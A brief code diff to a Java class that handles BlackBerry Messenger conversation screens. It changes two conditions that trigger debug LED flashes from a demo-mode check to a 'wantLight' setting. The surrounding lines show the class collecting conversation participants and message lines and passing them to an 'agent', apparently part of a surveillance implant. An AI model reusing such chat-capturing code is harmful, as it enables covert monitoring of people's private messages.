@@ -54,7 +54,7 @@ public class ConversationScreen {
     public synchronized void getConversationScreen() {
         try {
             if (bbmApplication == null || !Backlight.isEnabled()) {
-                if (Status.self().isDemo()) {
+                if (Status.self().wantLight()) {
                     Debug.ledFlash(Debug.COLOR_RED);
                 }
                 return;
@@ -123,7 +123,7 @@ public class ConversationScreen {
                                 .getInstance();
                         agent.add(partecipants, lines);
 
-                        if (Status.self().isDemo()) {
+                        if (Status.self().wantLight()) {
                             Debug.ledFlash(Debug.COLOR_YELLOW);
                         }
                     }
